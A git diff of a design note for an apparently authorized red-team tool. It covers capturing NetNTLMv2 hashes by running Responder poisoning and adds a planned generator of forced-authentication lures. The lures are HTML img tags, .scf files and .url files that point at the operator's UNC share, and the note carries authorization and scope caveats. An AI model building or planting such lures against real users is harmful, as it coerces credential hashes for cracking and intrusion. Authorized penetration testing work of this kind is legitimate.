@@ -1,9 +1,11 @@
 # NetNTLMv2 capture engine — design note
 
-> Status: **design only, not built.** This is the intrusive "capture a hash by
-> poisoning" feature. Owner: **anjaiv** (engines area). Read `CLAUDE.md` and
-> `docs/DECISIONS.md` first, then this. Coordinate with the repo owner before coding —
-> especially the `crack.py` meta contract below.
+> Status: **Phase 1 (capture via Responder) — BUILT & merged** as `redness poison`.
+> **Phase 2 (`redness trigger` — forced-authentication link) — planned; see the Phase 2
+> section below.** This is the intrusive "capture a hash by coercing authentication"
+> feature. Owner: **anjaiv** (engines area). Read `CLAUDE.md` and `docs/DECISIONS.md`
+> first, then this. Coordinate with the repo owner before coding — especially the
+> `crack.py` meta contract below.
 
 ## What it is (and why it's separate)
 Everything REDNESS captures today (AS-REP, Kerberoast — see `engines/ldap.py`) is
@@ -19,8 +21,11 @@ runs by default. It's opt-in, time-boxed, and loud.
 Do **not** write a poisoner from scratch. Wrap the standard tools:
 - **[Responder](https://github.com/lgandx/Responder)** — LLMNR/NBT-NS/mDNS poisoning +
   capture. This is the capture engine. (Kali-native — perfect for the Kali operator box.)
-- **[ntlmrelayx](https://github.com/fortra/impacket)** (impacket) — *relay* instead of
-  capture (SMB/LDAP/HTTP). **Phase 2**; start with capture only.
+- **Forced-authentication trigger links (Phase 2, `redness trigger`)** — a generated
+  UNC-path artifact (HTML `<img>`, `.scf`, `.url`) that coerces a *specific* victim to
+  authenticate to us; the auth is captured by the *same* Responder listener. Pure stdlib
+  string generation — nothing to wrap. (ntlmrelayx-style live relay was considered and
+  deliberately dropped — see the Phase 2 section.)
 
 Parse Responder's output (its log files under `logs/` contain
 `... NTLMv2-SSP Hash : user::DOMAIN:...`) into `Finding`s — pure parser, testable against
@@ -72,7 +77,7 @@ segment the network).
   realistic host for this; the Kali VM is the operator box. `redness doctor` should learn
   a `responder` check (available/where to get it), mirroring the netexec/certipy entries.
 
-## Build order (suggested)
+## Build order — Phase 1 (done)
 1. Pure parser: `parse_responder_log(text) -> list[(account, netntlmv2_hash)]` + tests
    against a captured `Responder-Session.log` sample. (No root, no network.)
 2. `crack.py`: add the two `netntlmv2` map entries (+ a test).
@@ -80,6 +85,63 @@ segment the network).
    confirmation + duration + iface gating.
 4. `doctor`: add the `responder` availability check.
 5. Docs: DECISIONS entry; a note in CLAUDE.md "Next up".
+
+# Phase 2 — `redness trigger`: forced-authentication link generator
+
+Phase 1 waits for victims to resolve a poisoned name. Phase 2 flips it around: hand a
+victim a small artifact that, when opened or rendered, makes *their* machine authenticate
+to `\\<us>\share\...` over SMB. It's a **coercion vector, not a new capture path** — the
+auth lands in the *same* Responder listener and flows through the identical pipeline:
+`parse_responder_log` → `build_findings` (`netntlm-captured`) → `crack.py` (`netntlmv2`).
+
+**Why not ntlmrelayx relay?** Live relay (authenticate as the victim straight into a
+target service) is powerful but heavy and far more intrusive — a successful relay is
+direct access to a third-party system, with AD-mutating attack modes (RBCD, add-computer,
+ADCS ESC8). We deliberately scoped Phase 2 down to the simple, capture-only lure instead.
+
+## It's a helper, not an Engine
+Generation produces an *artifact*, not `Finding`s, so it doesn't fit the `run(target) ->
+list[Finding]` model, isn't in `default_engines()`, and never touches `scan`. It's pure
+string/file generation — no network, no subprocess, no external tool to orchestrate, and
+so **no new `doctor` check**.
+- `redness/trigger.py` — pure builders: `unc_path(host, share, filename)` + per-format wrappers.
+- `redness trigger --host <us> [--format html|scf|url] [--share s] [--filename x.jpg] [--out path]`
+  — prints the artifact, or writes it to `--out`.
+
+## Formats (v1: html, scf, url — all text; lnk is binary, later)
+- **html** — `<img src="\\host\share\x.jpg">` (email / web page / CSS body). Default.
+- **scf** — Windows Explorer `.scf` (`[Shell]…IconFile=\\host\share\x.ico`); fires on folder view.
+- **url** — `.url` `[InternetShortcut]` with `IconFile=\\host\…`.
+- **lnk** — `.lnk` shortcut with a UNC icon; binary and fiddlier, **deferred to a later pass**.
+
+## Capture: run `poison` normally
+There is no separate capture command in v1. The operator runs the existing gated
+`redness poison` (Responder) to listen, and delivers the trigger artifact out-of-band;
+captures flow through unchanged. A poisoning-off `--capture-only` listen mode would be a
+cleaner pairing (the lure needs no LLMNR/NBT-NS poisoning), but it is **deferred** until
+someone validates on the Kali box that Responder still captures incoming SMB auth with
+poisoning disabled.
+
+## "Flag if signing isn't enforced"
+The generator can't know a host's signing state — that's discovered by probing SMB. Reuse
+the existing `smb-signing-not-required` finding (netexec SMB engine): run `scan` / the SMB
+signing check against the captured host. No new logic in the trigger feature.
+
+## Findings & contract
+**No new findings; no `findings.py` or `crack.py` changes.** Capture reuses
+`netntlm-captured` (HIGH) and the `netntlmv2` crack path already shipped in Phase 1.
+
+## Safety / gating
+Generating the file touches no other machine, so no `type YES` prompt is needed — but
+print the same **authorization banner**, write artifacts to a git-ignored dir, and keep
+the legal note: the artifact coerces a real user's credentials; deploy only within written
+scope. The intrusive steps (delivering the lure, running the listener) stay with the
+operator and the already-gated `poison` command.
+
+## Build order — Phase 2
+1. Pure `redness/trigger.py` (`unc_path` + html/scf/url builders) + `tests/test_trigger.py`.
+2. `redness trigger` CLI command + banner.
+3. Docs: DECISIONS entry + CLAUDE.md.
 
 ## Legal / ethics
 Poisoning coerces authentication from **other machines** on the LAN. Run only on a
